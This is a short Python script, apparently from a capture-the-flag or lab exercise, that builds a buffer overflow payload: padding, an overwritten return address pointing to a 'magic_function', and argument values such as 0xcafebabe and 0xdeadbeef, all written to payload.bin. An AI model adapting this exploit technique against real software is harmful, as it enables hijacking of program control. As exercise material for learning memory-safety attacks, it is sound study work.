buffer_size1 = 68
buffer_size2 = 64
value = 0xcafebabe
address_magic_function = 0x08049195
sexyvar = 0xdeadbeef
# Create payload

payload = b'A' * buffer_size1
payload += address_magic_function.to_bytes(4, 'little')  # Address of magic_function
payload += b'A' * 4
payload += value.to_bytes(4, 'little')
payload += b'\n'
payload += b'A' * buffer_size2
payload += sexyvar.to_bytes(4, 'little')

# Write length of payload and payload to a file
with open('payload.bin', 'wb') as f:
    f.write(payload)